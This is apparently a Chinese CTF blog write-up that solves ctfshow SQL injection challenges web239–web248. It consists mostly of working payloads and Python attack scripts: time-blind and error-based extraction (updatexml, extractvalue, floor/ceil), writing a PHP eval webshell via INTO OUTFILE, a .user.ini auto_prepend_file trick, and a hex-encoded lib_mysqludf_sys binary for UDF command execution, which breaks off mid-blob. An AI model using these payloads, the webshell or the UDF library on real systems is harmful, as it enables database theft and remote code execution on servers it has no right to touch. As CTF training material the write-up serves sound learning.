<p>注表名:<code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where (database_name)=database()))#&amp;password=1</code> </p>
<p>到这里不可避免的会想到无列名注入，但这里由于把空格的一些替代都过滤了，用括号去绕也会报错，所以无列名注入实现不了。</p>
<p>所以怎么去获取列名？看了一些大佬的wp，给了两种方式，一种是靠猜，就是<code>flag</code>。另外一种就是用bp去爆破。</p>
<p>注入值:<code>username=123&#39;,(select(flag)from(flagbb)))#&amp;password=1</code></p>
<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//插入数据</span><br><span class="line">$sql = &quot;insert into ctfshow_user(username,pass) value(&#x27;&#123;$username&#125;&#x27;,&#x27;&#123;$password&#125;&#x27;);&quot;;</span><br><span class="line">//过滤空格 or sys mysql</span><br></pre></td></tr></table></figure>

<p>在上题基础上，过滤了<code>sys,mysql</code>，导致<code>mysql.innodb_table_stats</code>也用不了了。这题给了提示，表名要靠爆破：</p>
<p>hint:<code>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</code></p>
<p>写个脚本去注入即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1=<span class="string">&quot;http://b25467ab-3f43-478a-981b-d15a91b1dd7c.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://b25467ab-3f43-478a-981b-d15a91b1dd7c.challenge.ctf.show/page.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                    char=i+j+k+l+m</span><br><span class="line">                    payload=<span class="string">&quot;admin&#x27;,(select(flag)from(flag&#123;&#125;)))#&quot;</span>.<span class="built_in">format</span>(char)</span><br><span class="line">                    data1=&#123;<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;password&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">                    res=requests.post(url1,data1)</span><br><span class="line">                    <span class="built_in">print</span>(res.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p><img src="https://img.picui.cn/free/2024/11/15/6736bed619f3c.png" alt="web240_1.png"></p>
<p>返回到page页面，可以看到插入成功:</p>
<p><img src="https://img.picui.cn/free/2024/11/15/6736bf17a3536.png" alt="web240_2.png"></p>
<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//删除记录</span><br><span class="line"> $sql = &quot;delete from  ctfshow_user where id = &#123;$id&#125;&quot;;</span><br><span class="line">//无过滤</span><br></pre></td></tr></table></figure>

<p>没有任何过滤，这里尝试了一下时间盲注，发现可以。</p>
<p>直接上脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://d8d97e8d-1fef-4e59-aa68-d928fb7dd9f1.challenge.ctf.show/api/delete.php&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.1),1)&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        data1=&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url,data=data1)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>这里有个细节，题目设置不让过多的请求和访问。所以一开始一直打不通，得有一个<code>time.sleep(0.5)</code>的过程。加上就能通了。</p>
<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//备份表</span><br><span class="line">$sql = &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;;&quot;;</span><br><span class="line">无过滤</span><br></pre></td></tr></table></figure>

<p>很容易想到去写shell，但是这里的select后面不可控，我们能控的是<code>into outfile</code>后面的数据，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">outfile的语法</span><br><span class="line"></span><br><span class="line">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"></span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br><span class="line">        [ESCAPED BY &#x27;char&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#x27;string&#x27;]</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"></span><br><span class="line">FIELDS TERMINATED BY &#x27;字符串&#x27;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">FIELDS ENCLOSED BY &#x27;字符&#x27;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">FIELDS ESCAPED BY &#x27;字符&#x27;：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">LINES STARTING BY &#x27;字符串&#x27;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">LINES TERMINATED BY &#x27;字符串&#x27;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br></pre></td></tr></table></figure>

<p>根据上述介绍，payload:<code>filename=1.php&#39; LINES STARTING BY &#39;&lt;?php eval($_POST[1]);?&gt;&#39;#</code>，一句话木马路径:<code>/dump/1.php</code></p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//备份表</span><br><span class="line">$sql = &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;;&quot;;</span><br><span class="line">过滤了 php</span><br></pre></td></tr></table></figure>

<p>过滤了php，我们可以先传一个1.txt文件，这个文件内容是一句话木马。然后我们再去传一个<code>.user.ini</code>文件，内容就是包含这个<code>1.txt</code>文件，不就可以了。（因为这个题目的环境是nginx，所以是包含<code>.user.ini</code>，如果这个题目环境是<code>apache</code>，那么就是包含<code>.htaccess</code>文件。</p>
<p>所以首先我们传:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://932b6bba-986e-4b0e-9e31-7ce7200bafb1.challenge.ctf.show/api/dump.php</span><br><span class="line">post传：filename=1.txt&#x27; lines starting by &#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;#</span><br></pre></td></tr></table></figure>

<p>然后再去传：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://932b6bba-986e-4b0e-9e31-7ce7200bafb1.challenge.ctf.show/api/dump.php</span><br><span class="line">post传：filename=.user.ini&#x27; lines starting by &#x27;auto_prepend_file=1.txt\n&#x27;#</span><br></pre></td></tr></table></figure>

<p>细节：1.这里去传<code>.user.ini</code>的时候，在后面一定要换行，不然会对<code>.user.ini</code>文件造成影响。</p>
<p>​           2.另外这里的<code>.user.ini</code>文件不能被覆盖，会以第一次写入的为主。这里我也不清楚具体原因。</p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//备份表</span><br><span class="line">$sql = &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br><span class="line">无过滤</span><br></pre></td></tr></table></figure>

<p>首先尝试<code>?id=1&#39;</code> 发现产生了报错，所以这里可以考虑报错注入。</p>
<p>payload:<code>https://3186dff5-29a3-4db3-8059-0105f29ee0d8.challenge.ctf.show/api/?id=1%27and%20updatexml(1,concat(0x3e,database(),0x3e),1)%23</code></p>
<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><p>还是接着上题，报错注入，只不过这里过滤了<code>updatexml</code>，我们可以找到平替的<code>extractvalue</code>，注意这里语法稍微和<code>updatexml</code>有些许差别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取数据库：</span><br><span class="line">https://b44a500e-b8cc-4504-8db9-2d994bb84249.challenge.ctf.show/api/?id=1%27and%20extractvalue(1,concat(0x7e,database(),0x7e))%23</span><br><span class="line">获取表名：</span><br><span class="line">https://b44a500e-b8cc-4504-8db9-2d994bb84249.challenge.ctf.show/api/?id=1%27and%20extractvalue(1,concat(0x7e,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()),0x7e))%23</span><br><span class="line">获取字段名：</span><br><span class="line">https://b44a500e-b8cc-4504-8db9-2d994bb84249.challenge.ctf.show/api/?id=1%27and%20extractvalue(1,concat(0x7e,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27ctfshow_flagsa%27),0x7e))%23</span><br><span class="line">获取值:</span><br><span class="line">https://b44a500e-b8cc-4504-8db9-2d994bb84249.challenge.ctf.show/api/?id=1%27and%20extractvalue(1,concat(0x7e,(select%20flag1%20from%20ctfshow_flagsa),0x7e))%23</span><br><span class="line">但这里只能获得一半，我们还得想办法获取右边的一半：(使用right函数即可)</span><br><span class="line">https://b44a500e-b8cc-4504-8db9-2d994bb84249.challenge.ctf.show/api/?id=1%27and%20extractvalue(1,concat(0x7e,right((select%20flag1%20from%20ctfshow_flagsa),16),0x7e))%23</span><br></pre></td></tr></table></figure>

<p>这里扩展一下mysql 字符串截取函数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">left(str,len):从左边开始截取，str:被截取的字符串，len:截取长度</span><br><span class="line">right(str,len):从右边开始截取，str:被截取的字符串，len:截取的长度</span><br><span class="line">substring(str,pos,len):str:被截取的字符串，pos:截取开始的位置，len：截取的长度</span><br><span class="line">substr(str,pos,len):同substring</span><br><span class="line">mid(str,pos,len):同substring、substr</span><br></pre></td></tr></table></figure>

<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>在上面两题的基础上<code>extractvalue</code>也被过滤了。</p>
<p>这里扩展几个报错注入的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp报错注入(mysql 5.5-5.6版本)</span><br><span class="line">payload:and (exp(~(select * from (操作代码) a)))</span><br><span class="line"></span><br><span class="line">floor报错注入：https://blog.csdn.net/weixin_46706771/article/details/112726901</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个题目使用floor去报错，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取表名：</span><br><span class="line">https://a4309304-126e-4f5f-aad6-267156664ba9.challenge.ctf.show/api/?id=1&#x27; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a#</span><br><span class="line">获取字段名：</span><br><span class="line">https://a4309304-126e-4f5f-aad6-267156664ba9.challenge.ctf.show/api/?id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,(select%20(column_name)%20from%20information_schema.columns%20where%20table_name=&#x27;ctfshow_flags&#x27;%20%20limit%201,1),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a%23</span><br><span class="line">获取字段的值：</span><br><span class="line">https://a4309304-126e-4f5f-aad6-267156664ba9.challenge.ctf.show/api/?id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,(select%20flag2%20from%20ctfshow_flags%20%20limit%200,1),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a%23</span><br></pre></td></tr></table></figure>

<p>注意这个题目有个细节，限制了回显的一些数据，所以不能用<code>group_concat</code>，只能用 <code>limit 1,1</code> 这种形式来获取回显数据。</p>
<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p><code>floor</code>被禁用了，我们换别的取整函数，这里用的是<code>ceil</code>来替代，注入方式同246</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取表名：</span><br><span class="line">https://b0e97e09-494b-4f92-bfe1-6011eababdb5.challenge.ctf.show/api/?id=id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,(select%20(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20%20limit%201,1),0x3a,0x3a,ceil(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a%23</span><br><span class="line">获取字段名：</span><br><span class="line">https://b0e97e09-494b-4f92-bfe1-6011eababdb5.challenge.ctf.show/api/?id=id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,(select%20(column_name)%20from%20information_schema.columns%20where%20table_name=%27ctfshow_flagsa%27%20%20limit%201,1),0x3a,0x3a,ceil(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a%23</span><br><span class="line">获取字段值：</span><br><span class="line">https://b0e97e09-494b-4f92-bfe1-6011eababdb5.challenge.ctf.show/api/?id=id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,(select%20(`flag?`)%20from%20ctfshow_flagsa%20%20limit%200,1),0x3a,0x3a,ceil(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a%23</span><br></pre></td></tr></table></figure>

<p>注意这里因为字段名是<code>flag?</code>，这里有个<code>?</code>比较特殊，所以这里用反引号来标识一下。</p>
<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>这个题目考察的是UDF提权，网上国光师傅写的一篇文章非常好<code>https://www.sqlsec.com/tools/udf.html</code>。</p>
<p>大致思路就是往<code>xxxxx/xxxx/plugin</code>目录下面写入 <code>.so</code>文件，里面是我们构造好的编译好的可以执行命令的函数，然后去调用，那么重点就是写入的问题。</p>
<p>1.你得有读写权限吧？，这个就看你拿到的权限是啥。<code>mysql?root?</code>，怎么拿到权限，一般的思路国光师傅也在文章中写明了。</p>
<p>2.你得知道写到哪里吧？，这个可以通过语句来查询:<code>show variables like &#39;%plugin%&#39;;</code>，得到的地址就是我们<code>.so</code>文件要写入的地址。</p>
<p>参考的大佬的脚本，贴上来做一下解释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5e458827-0235-43c9-b16a-0d7babdf74dd.challenge.ctf.show/api/&quot;</span></span><br><span class="line">udf=<span class="string">&quot;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e